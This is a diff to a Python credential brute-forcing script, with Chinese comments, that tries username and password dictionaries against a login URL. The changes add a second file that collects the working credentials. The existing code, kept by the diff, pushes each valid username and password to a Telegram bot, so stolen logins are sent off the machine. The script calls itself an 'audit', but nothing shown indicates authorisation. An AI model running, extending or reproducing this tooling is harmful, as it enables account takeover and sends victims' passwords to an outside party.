@@ -7,6 +7,7 @@ USER_FIELD = "email"
 PWD_FIELD = "password"
 REQUEST_INTERVAL = 1.0
 RESULT_FILE_PATH = "success_log.txt"
+SUMMARY_TXT_PATH = "success_summary.txt"  # 打包整理后的TXT文件
 
 # ==================== Telegram 配置 ====================
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
@@ -48,13 +49,20 @@ def get_passwords():
 
 def log_success(username, password):
     """记录成功凭据并触发电报推送"""
+    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+    
+    # 1. 写入原始日志
     with open(RESULT_FILE_PATH, "a", encoding="utf-8") as f:
-        current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
         f.write(f"[{current_time}] 成功: 账号={username} ---- 密码={password}\n")
+        
+    # 2. 写入打包整理好的 TXT 文件（格式化排版）
+    with open(SUMMARY_TXT_PATH, "a", encoding="utf-8") as f:
+        f.write(f"账号: {username} | 密码: {password} | 时间: {current_time}\n")
+        
     print(f"[+] 【成功记录】 {username} -> {password} 已保存")
     
-    # 触发电报推送
-    msg = f"🚨 *发现有效凭据* 🚨\n\n- 账号: `{username}`\n- 密码: `{password}`\n- 时间: `{time.strftime('%Y-%m-%d %H:%M:%S')}`"
+    # 3. 触发电报推送
+    msg = f"🚨 *发现有效凭据* 🚨\n\n- 账号: `{username}`\n- 密码: `{password}`\n- 时间: `{current_time}`"
     send_telegram_msg(msg)
 
 def is_login_success(response):
@@ -82,6 +90,10 @@ def main():
     if not usernames or not passwords:
         print("[!] 错误：未找到有效的账号字典(users.txt)或密码字典(passwords.txt)！")
         return
+
+    # 每次运行前清空旧的汇总TXT（可选，避免重复累加）
+    if os.path.exists(SUMMARY_TXT_PATH):
+        os.remove(SUMMARY_TXT_PATH)
 
     print(f"[*] 全自动审计开始，共 {len(usernames)} 个账号，{len(passwords)} 个密码")
     print(f"[*] 目标: {LOGIN_URL}\n")
@@ -114,6 +126,8 @@ def main():
 
             if not found:
                 print(f"[-] 账号 {username} 未找到正确密码")
+
+    print("\n[*] 全自动审计结束，所有账号已处理完毕。")
 
 if __name__ == "__main__":
     main()
